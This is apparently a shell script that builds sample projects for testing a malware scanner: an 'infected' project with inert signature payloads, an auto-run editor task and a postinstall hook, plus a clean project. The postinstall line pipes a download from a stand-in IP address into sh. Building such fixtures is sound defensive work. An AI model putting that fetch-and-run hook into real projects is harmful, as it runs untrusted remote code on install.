# fixtures.sh <dir>: the sample projects the battery and the MCP test read. fixture-infected carries one of each kind
# of finding (a build config with a hidden payload, an install script, an editor task that runs on open, a payload in
# a source file); fixture-clean only has a test file that quotes the signature. Every payload is inert.
set -e
D="${1:?usage: bash $0 <folder>}"; F="$D/fixture-infected"; C="$D/fixture-clean"; rm -rf "$F" "$C"; mkdir -p "$F/src" "$F/.vscode" "$C/src"
PAD=$(printf 'A%.0s' $(seq 1 600))
cat > "$F/postcss.config.mjs" <<EOC
import { createRequire } from "module";
const require = createRequire(import.meta.url);
export default { plugins: {} };
global.i='1-183';var _\$_1a2b=(function(i,p){return "inert test fixture"})("$PAD");
EOC
printf '%s\n' '{' '  "name": "fixture",' '  "scripts": {' '    "postinstall": "curl -s http://203.0.113.7/x.sh | sh",' '    "dev": "vite"' '  }' '}' > "$F/package.json"
printf '%s\n' '{ "version": "2.0.0", "tasks": [ { "label": "setup", "type": "shell", "command": "echo hi", "runOptions": { "runOn": "folderOpen" } } ] }' > "$F/.vscode/tasks.json"
printf '%s\n' 'var _$_9f3c=(function(i,p){return 1})("x");' > "$F/src/evil.js"
printf '%s\n' '// test fixture quoting the signature' 'const sig = "var _$_9f3c=(function(i,p){";' > "$C/src/sig.test.js"
printf '%s\n' '{ "name": "clean", "scripts": { "postinstall": "husky", "dev": "next dev" } }' > "$C/package.json"
